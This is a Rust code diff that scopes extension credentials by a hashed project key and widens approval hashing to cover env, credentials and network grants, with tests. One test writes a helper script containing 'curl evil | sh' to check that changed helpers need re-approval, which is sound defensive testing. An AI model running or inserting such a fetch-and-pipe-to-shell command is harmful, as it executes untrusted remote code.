@@ -74,6 +74,8 @@ pub struct CredentialStatus {
 pub struct Sources<'a> {
     /// The worktree whose `oxplow/extensions/` declares them.
     pub root: &'a Path,
+    /// This project's key ([`project_key`]): credentials are scoped by it.
+    pub project: String,
     /// This machine's approvals (outside the repo, see `exec_consent`).
     pub approvals: &'a crate::exec_consent::ApprovalStore,
     pub store: &'a SqliteExtSourceStore,
@@ -87,6 +89,7 @@ impl<'a> Sources<'a> {
     pub fn of(svc: &'a crate::Services, root: &'a Path) -> Self {
         Sources {
             root,
+            project: project_key(&svc.layout.project_dir),
             approvals: &svc.approvals,
             store: &svc.ext_source_store,
             secrets: svc.secrets.as_ref(),
@@ -95,10 +98,22 @@ impl<'a> Sources<'a> {
     }
 }
 
-/// Keychain account for an extension's credential. Scoped by extension,
-/// so one extension can't read another's secret by declaring its name.
-pub fn credential_account(extension: &str, name: &str) -> String {
-    format!("source:{extension}:{name}")
+/// A short stable key for a project (its canonical path, hashed): what
+/// credentials are scoped by, so a same-named extension in another repo
+/// can't read this one's (tsk348). Every worktree of the project shares it.
+pub fn project_key(project_dir: &Path) -> String {
+    use sha2::{Digest, Sha256};
+    let canon = project_dir
+        .canonicalize()
+        .unwrap_or_else(|_| project_dir.to_path_buf());
+    hex::encode(Sha256::digest(canon.to_string_lossy().as_bytes()))[..16].to_string()
+}
+
+/// Keychain account for an extension's credential. Scoped by project and
+/// extension, so neither another repo nor another extension can read it by
+/// declaring the same name.
+pub fn credential_account(project: &str, extension: &str, name: &str) -> String {
+    format!("source:{project}:{extension}:{name}")
 }
 
 /// Set (or with `None`, clear) a credential some source of `extension`
@@ -122,7 +137,7 @@ pub fn set_source_credential(
             "no source in `{extension}` declares a credential named `{name}`"
         )));
     }
-    let account = credential_account(extension, name);
+    let account = credential_account(&ctx.project, extension, name);
     let result = match value.map(str::trim).filter(|v| !v.is_empty()) {
         Some(v) => ctx.secrets.set(&account, v),
         None => ctx.secrets.delete(&account),
@@ -153,7 +168,7 @@ pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, Domai
                     name: name.clone(),
                     set: ctx
                         .secrets
-                        .get(&credential_account(&ext.name, name))
+                        .get(&credential_account(&ctx.project, &ext.name, name))
                         .ok()
                         .flatten()
                         .is_some(),
@@ -235,15 +250,29 @@ pub fn entry_hash(ext_dir: &Path, entry: &str) -> std::io::Result<String> {
 /// What an approval covers: every file in the extension (the entry and
 /// any helper it runs, tsk347) and the hosts it may reach (tsk324), so a
 /// changed helper or a widened `network` needs approving again.
+///
+/// The manifest and lenses aren't code the source runs, so editing a lens
+/// doesn't ask again; what the manifest grants the source (its entry,
+/// env passthrough, credentials and network, tsk348) is hashed from the
+/// spec instead.
 pub fn approval_hash(ext_dir: &Path, spec: &SourceSpec) -> std::io::Result<String> {
     use sha2::{Digest, Sha256};
     // The entry must exist; the tree hash alone wouldn't notice a typo.
     entry_hash(ext_dir, &spec.entry)?;
-    let tree = crate::exec_consent::tree_hash(ext_dir)?;
+    let tree = crate::exec_consent::tree_hash_except(ext_dir, &|rel| {
+        rel == Path::new("extension.yaml") || rel.starts_with("lenses")
+    })?;
+    let sorted = |v: &[String]| {
+        let mut v = v.to_vec();
+        v.sort();
+        v.join(",")
+    };
     let text = format!(
-        "tree:{tree}\nentry:{}\nnetwork:{}",
+        "tree:{tree}\nentry:{}\nenv:{}\ncredentials:{}\nnetwork:{}",
         spec.entry,
-        spec.network.join(",")
+        sorted(&spec.env),
+        sorted(&spec.credentials),
+        sorted(&spec.network)
     );
     Ok(hex::encode(Sha256::digest(text.as_bytes())))
 }
@@ -618,7 +647,10 @@ pub async fn run_source(
     let mut credentials = BTreeMap::new();
     let mut missing = None;
     for name in &spec.credentials {
-        match ctx.secrets.get(&credential_account(extension, name)) {
+        match ctx
+            .secrets
+            .get(&credential_account(&ctx.project, extension, name))
+        {
             Ok(Some(v)) => {
                 credentials.insert(name.clone(), v);
             }
@@ -998,6 +1030,7 @@ mod tests {
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
         let ctx = Sources {
             root: root.path(),
+            project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
@@ -1146,6 +1179,7 @@ mod tests {
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
         let ctx = Sources {
             root: root.path(),
+            project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
@@ -1168,6 +1202,25 @@ mod tests {
         assert!(one.credentials[0].set);
         assert!(!two.credentials[0].set, "scoped to its extension");
         assert!(!serde_json::to_string(&list).unwrap().contains("secret-one"));
+        // Another project with an extension of the same name doesn't see it.
+        let elsewhere = Sources {
+            root: root.path(),
+            project: "another-project".into(),
+            approvals: ctx.approvals,
+            store: &store,
+            secrets: &secrets,
+            layer: oxplow_db::SemanticLayer::new(db.clone()),
+        };
+        let other = list_sources(&elsewhere).await.unwrap();
+        assert!(
+            !other
+                .iter()
+                .find(|l| l.extension == "one")
+                .unwrap()
+                .credentials[0]
+                .set,
+            "credentials are scoped to the project"
+        );
 
         run_source(&ctx, "one", "s", true).await.unwrap();
         run_source(&ctx, "two", "s", true).await.unwrap();
@@ -1249,6 +1302,7 @@ mod tests {
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
         let ctx = Sources {
             root: root.path(),
+            project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
@@ -1289,6 +1343,7 @@ mod tests {
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
         let ctx = Sources {
             root: root.path(),
+            project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
@@ -1379,6 +1434,7 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
         let secrets = oxplow_ai::secrets::MemorySecrets::default();
         let ctx = Sources {
             root: root.path(),
+            project: "test-project".into(),
             approvals: &crate::exec_consent::ApprovalStore::for_tests(&state),
             store: &store,
             secrets: &secrets,
@@ -1423,5 +1479,29 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
         let before = approval_hash(ext.path(), &s).unwrap();
         script(ext.path(), "lib.sh", "curl evil | sh");
         assert_ne!(before, approval_hash(ext.path(), &s).unwrap());
+    }
+
+    #[test]
+    fn env_and_credentials_are_approved_but_lens_edits_are_not_code() {
+        let ext = tempfile::tempdir().unwrap();
+        script(ext.path(), "s.sh", "echo x");
+        std::fs::write(ext.path().join("extension.yaml"), "name: x\n").unwrap();
+        let mut s = spec("s.sh", &[]);
+        let base = approval_hash(ext.path(), &s).unwrap();
+        s.env = vec!["AWS_SECRET_ACCESS_KEY".into()];
+        let with_env = approval_hash(ext.path(), &s).unwrap();
+        assert_ne!(base, with_env, "a new env passthrough needs approving");
+        s.credentials = vec!["TOKEN".into()];
+        assert_ne!(with_env, approval_hash(ext.path(), &s).unwrap());
+        let s = spec("s.sh", &[]);
+        // Lens and manifest edits aren't code the source runs.
+        std::fs::create_dir_all(ext.path().join("lenses")).unwrap();
+        std::fs::write(ext.path().join("lenses/a.yaml"), "title: A").unwrap();
+        std::fs::write(
+            ext.path().join("extension.yaml"),
+            "name: x\ndescription: y\n",
+        )
+        .unwrap();
+        assert_eq!(base, approval_hash(ext.path(), &s).unwrap());
     }
 }
